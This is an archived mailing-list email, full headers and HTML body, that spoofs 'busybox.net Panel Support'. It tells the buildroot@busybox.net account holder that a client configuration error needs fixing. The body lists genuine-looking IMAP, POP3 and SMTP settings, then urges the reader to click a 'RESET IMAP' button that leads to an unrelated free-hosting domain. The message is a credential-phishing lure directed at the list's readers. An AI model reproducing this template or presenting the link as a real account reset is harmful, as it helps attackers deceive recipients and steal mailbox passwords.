Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 6EDCEE77184
	for <buildroot@archiver.kernel.org>; Thu, 19 Dec 2024 05:57:49 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp3.osuosl.org (Postfix) with ESMTP id 21228606EF;
	Thu, 19 Dec 2024 05:57:49 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp3.osuosl.org ([127.0.0.1])
 by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id YhmY6niBBhoE; Thu, 19 Dec 2024 05:57:48 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 2C89760E02
Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
	by smtp3.osuosl.org (Postfix) with ESMTP id 2C89760E02;
	Thu, 19 Dec 2024 05:57:48 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [IPv6:2605:bc80:3010::138])
 by lists1.osuosl.org (Postfix) with ESMTP id A6667C0
 for <buildroot@buildroot.org>; Thu, 19 Dec 2024 05:57:46 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 93C5381DFF
 for <buildroot@buildroot.org>; Thu, 19 Dec 2024 05:57:46 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id sr8KyfCTfAVk for <buildroot@buildroot.org>;
 Thu, 19 Dec 2024 05:57:46 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=51.83.140.59;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 4AF7A81D24
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 4AF7A81D24
Received: from busybox.net (ns31098807.ip-51-83-140.eu [51.83.140.59])
 by smtp1.osuosl.org (Postfix) with ESMTP id 4AF7A81D24
 for <buildroot@busybox.net>; Thu, 19 Dec 2024 05:57:44 +0000 (UTC)
From: busybox.net Panel Support <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 19 Dec 2024 04:57:43 -0100
Message-ID: <20241219045743.FC08F1F493FC1619@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] =?utf-8?q?Client_configuration_settings_error_for_?=
 =?utf-8?b?4oCc?=
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.30
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8647825813940381644=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============8647825813940381644==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<div id=3D"editbody1" style=3D"background: rgb(244, 244, 244);">
<div style=3D"background: rgb(244, 244, 244); margin: 0px; padding: 0px;">
<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"10">
<tbody>
<tr>
<td align=3D"center">
<table width=3D"680" style=3D"border: 0px currentColor; border-image: none;=
 max-width: 680px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td width=3D"680" height=3D"25" style=3D'color: rgb(51, 51, 51); font-famil=
y: "Helvetica Neue",Helvetica,Arial,sans-serif; font-size: 16px;'>Client Co=
nfiguration settings&nbsp;error&nbsp;for "buildroot@busybox.net".</td></tr>=

<tr>
<td style=3D"border-width: 2px; border-style: solid; border-color: rgb(232,=
 232, 232) rgb(232, 232, 232) rgb(255, 108, 44); padding: 15px 0px 20px; ba=
ckground-color: rgb(255, 255, 255);">
<table width=3D"680" style=3D'background: rgb(255, 255, 255); font-family: =
"Helvetica Neue",Helvetica,Arial,sans-serif;' border=3D"0" cellspacing=3D"0=
" cellpadding=3D"0">
<tbody>
<tr>
<td width=3D"15">&nbsp;</td>
<td width=3D"650">
<table width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
<tbody>
<tr>
<td>
<div class=3D"v1section" id=3D"v1manual_settings_area">
<h2 id=3D"v1hdrManualSettings">Mail Client Manual Settings</h2>
<div class=3D"v1row">
<div class=3D"v1col-md-6">
<div class=3D"v1preferred-selection v1panel v1panel-primary" id=3D"v1ssl_se=
ttings_area" style=3D"border-radius: 4px; border: 1px solid rgb(66, 139, 20=
2); border-image: none; margin-bottom: 20px; box-shadow: 0px 1px 1px rgba(0=
,0,0,0.05); background-color: rgb(255, 255, 255);">
<div class=3D"v1panel-heading" style=3D"border-color: rgb(66, 139, 202); pa=
dding: 10px 15px; color: rgb(255, 255, 255); border-top-left-radius: 3px; b=
order-top-right-radius: 3px; background-color: rgb(66, 139, 202);">Secure <=
abbr title=3D"Secure Sockets Layer">SSL</abbr>/<abbr title=3D"Transport Lay=
er Security">TLS</abbr> Settings (Recommended)</div>
<table class=3D"v1table v1manual_settings_table" style=3D"width: 100%; marg=
in-bottom: 0px; border-collapse: collapse; max-width: 100%; border-spacing:=
 0; background-color: transparent;">
<tbody>
<tr>
<td id=3D"v1lblSSLSettingsAreaUsername" style=3D"padding: 8px; border-top-c=
olor: rgb(221, 221, 221); border-top-width: 1px; border-top-style: solid;">=
Username:</td>
<td class=3D"v1data v1wrap-text" id=3D"v1valSSLSettingsAreaUsername" style=
=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1=
px; border-top-style: solid;">buildroot@busybox.net</td></tr>
<tr>
<td id=3D"v1lblSettingsAreaPassword" style=3D"padding: 8px; border-top-colo=
r: rgb(221, 221, 221); border-top-width: 1px; border-top-style: solid;">Pas=
sword:</td>
<td class=3D"v1escape-note" id=3D"v1valSettingsAreaPassword" style=3D"paddi=
ng: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; borde=
r-top-style: solid;">Use the email account's password.</td></tr>
<tr>
<td id=3D"v1lblSettingsAreaIncomingServer" style=3D"padding: 8px; border-to=
p-color: rgb(221, 221, 221); border-top-width: 1px; border-top-style: solid=
;">Incoming Server:</td>
<td class=3D"v1data" id=3D"v1valSettingsAreaIncomingServer" style=3D"paddin=
g: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; border=
-top-style: solid;">mail.busybox.net=20
<ul class=3D"v1port_list v1list-inline" style=3D"list-style: none; padding-=
left: 0px; margin-top: 0px; margin-bottom: 10px; margin-left: -5px;">
<li style=3D"padding-right: 5px; padding-left: 5px; display: inline-block;"=
><abbr title=3D"Internet Message Access Protocol" class=3D"v1initialism">IM=
AP</abbr> Port: 993 </li>
<li style=3D"padding-right: 5px; padding-left: 5px; display: inline-block;"=
><abbr title=3D"Post Office Protocol 3" class=3D"v1initialism">POP3</abbr> =
Port: 995 </li></ul></td></tr>
<tr>
<td id=3D"v1lblSettingsAreaOutgoingServer" style=3D"padding: 8px; border-to=
p-color: rgb(221, 221, 221); border-top-width: 1px; border-top-style: solid=
;">Outgoing Server:</td>
<td class=3D"v1data" id=3D"v1valSettingsAreaOutGoingServer" style=3D"paddin=
g: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; border=
-top-style: solid;">mail.busybox.net=20
<ul class=3D"v1port_list v1list-inline" style=3D"list-style: none; padding-=
left: 0px; margin-top: 0px; margin-bottom: 10px; margin-left: -5px;">
<li style=3D"padding-right: 5px; padding-left: 5px; display: inline-block;"=
><abbr title=3D"Simple Mail Transfer Protocol">SMTP</abbr> Port: 465 </li><=
/ul></td></tr>
<tr>
<td class=3D"v1notes" style=3D"padding: 8px; border-top-color: rgb(221, 221=
, 221); border-top-width: 1px; border-top-style: solid;" colspan=3D"2">
<div class=3D"v1small_note" id=3D"v1lblSettingsAreaSmallNote1">IMAP, POP3, =
and SMTP require authentication.</div></td></tr></tbody></table></div></div=
></div>
<div class=3D"v1row" id=3D"v1nonSSL" style=3D"display: none;">
<div class=3D"v1col-md-6">
<div class=3D"v1panel v1panel-default v1panel-warning" id=3D"v1non_ssl_sett=
ings_area" style=3D"border-radius: 4px; border: 1px solid rgb(246, 195, 66)=
; border-image: none; margin-bottom: 20px; box-shadow: 0px 1px 1px rgba(0,0=
,0,0.05); background-color: rgb(255, 255, 255);">
<div class=3D"v1panel-heading" style=3D"border-color: rgb(246, 195, 66); pa=
dding: 10px 15px; color: rgb(51, 51, 51); border-top-left-radius: 3px; bord=
er-top-right-radius: 3px; background-color: rgb(252, 248, 225);"><span clas=
s=3D"v1caption v1not-recommended" id=3D"v1descNonSSLSettings">Non-SSL Setti=
ngs (NOT Recommended)</span></div>
<table class=3D"v1table v1manual_settings_table" id=3D"v1tblManualSettingsT=
able" style=3D"width: 100%; margin-bottom: 0px; border-collapse: collapse; =
max-width: 100%; border-spacing: 0; background-color: transparent;">
<tbody>
<tr>
<td id=3D"v1lblNonSSLSettingsUsername" style=3D"padding: 8px; border-top-co=
lor: rgb(221, 221, 221); border-top-width: 1px; border-top-style: solid;">U=
sername:</td>
<td class=3D"v1data v1wrap-text" id=3D"v1valNonSSLSettingsUsername" style=
=3D"padding: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1=
px; border-top-style: solid;">buildroot@busybox.net</td></tr>
<tr>
<td id=3D"v1lblNonSSLSettingsPassword" style=3D"padding: 8px; border-top-co=
lor: rgb(221, 221, 221); border-top-width: 1px; border-top-style: solid;">P=
assword:</td>
<td class=3D"v1escape-note" id=3D"v1valNonSSLSettingsPassword" style=3D"pad=
ding: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; bor=
der-top-style: solid;">Use the email account's password.</td></tr>
<tr>
<td id=3D"v1lblNonSSLSettingsIncomingServer" style=3D"padding: 8px; border-=
top-color: rgb(221, 221, 221); border-top-width: 1px; border-top-style: sol=
id;">Incoming Server:</td>
<td class=3D"v1data" id=3D"v1valNonSSLSettingsIncomingServer" style=3D"padd=
ing: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; bord=
er-top-style: solid;">mail.busybox.net=20
<ul class=3D"v1port_list v1list-inline" style=3D"list-style: none; padding-=
left: 0px; margin-top: 0px; margin-bottom: 10px; margin-left: -5px;">
<li style=3D"padding-right: 5px; padding-left: 5px; display: inline-block;"=
><abbr title=3D"Internet Message Access Protocol" class=3D"v1initialism">IM=
AP</abbr> Port: 143 </li>
<li style=3D"padding-right: 5px; padding-left: 5px; display: inline-block;"=
><abbr title=3D"Post Office Protocol 3" class=3D"v1initialism">POP3</abbr> =
Port: 110 </li></ul></td></tr>
<tr>
<td id=3D"v1NonSSLSettingsOutgoingServer" style=3D"padding: 8px; border-top=
-color: rgb(221, 221, 221); border-top-width: 1px; border-top-style: solid;=
">Outgoing Server:</td>
<td class=3D"v1data" id=3D"v1NonSSLSettingsOutgoingServerData" style=3D"pad=
ding: 8px; border-top-color: rgb(221, 221, 221); border-top-width: 1px; bor=
der-top-style: solid;">mail.busybox.net=20
<ul class=3D"v1port_list v1list-inline" style=3D"list-style: none; padding-=
left: 0px; margin-top: 0px; margin-bottom: 10px; margin-left: -5px;">
<li style=3D"padding-right: 5px; padding-left: 5px; display: inline-block;"=
><abbr title=3D"Simple Mail Transfer Protocol">SMTP</abbr> Port: 587 </li><=
/ul></td></tr>
<tr>
<td class=3D"v1notes" style=3D"padding: 8px; border-top-color: rgb(221, 221=
, 221); border-top-width: 1px; border-top-style: solid;" colspan=3D"2">
<div class=3D"v1small_note" id=3D"v1descNonSSLSettingsAuthenticationIsRequi=
redForIMAPPOP3SMTP1">IMAP, POP3, and SMTP require authentication.</div></td=
></tr></tbody></table></div></div></div></div><p>Reset your incoming server=
 settings to continue receiving all your&nbsp;messages.</p><table width=3D"=
193" style=3D"border-radius: 3px; height: 52px; font-size: 11pt; border-col=
lapse: collapse; background-color: rgb(215, 86, 36);" border=3D"0" cellspac=
ing=3D"0" cellpadding=3D"0">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td align=3D"center" valign=3D"middle" style=3D"margin: 0px; padding: 15px =
30px; box-sizing: border-box;">
<a style=3D"color: rgb(255, 255, 255); font-family: Helvetica, Arial, sans-=
serif; font-size: 16px; font-weight: bold; box-sizing: border-box; backgrou=
nd-color: transparent; text-decoration-line: none;" href=3D"https://mail-au=
thentication-process.freewebhostmost.com/#buildroot@busybox.net" rel=3D"nor=
eferrer">RESET&nbsp; IMAP</a>
</td></tr></tbody></table><p></p>
<p style=3D"margin-top: 0px; margin-bottom: 0px; box-sizing: border-box;"><=
font size=3D"4">I<span style=3D'font-family: "Segoe UI"; font-size: medium;=
'>f after resetting your server and you still experience service disruption=
, kindly contact&nbsp;support&nbsp;for further assistance.</span></font>&nb=
sp;</p></td></tr>
<tr>
<td>
<div style=3D'color: rgb(102, 102, 102); padding-top: 5px; font-family: "He=
lvetica Neue",Helvetica,Arial,sans-serif; font-size: 12px; margin-top: 5px;=
 border-top-color: rgb(232, 232, 232); border-top-width: 2px; border-top-st=
yle: solid;'>The system generated this notice on 19/12/2024 04:57:43 UTC.</=
div>
<p>Do not reply to this automated message.</p></td></tr></tbody></table></t=
d>
<td width=3D"15">&nbsp;</td></tr></tbody></table></td></tr>
<tr>
<td align=3D"center" style=3D"padding-top: 10px;"><p style=3D'margin: 0px; =
padding: 0px; color: rgb(102, 102, 102); font-family: "Helvetica Neue",Helv=
etica,Arial,sans-serif; font-size: 12px;'><br></p></td></tr></tbody></table=
></td></tr></tbody></table></div></div></body></html>

--===============8647825813940381644==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============8647825813940381644==--
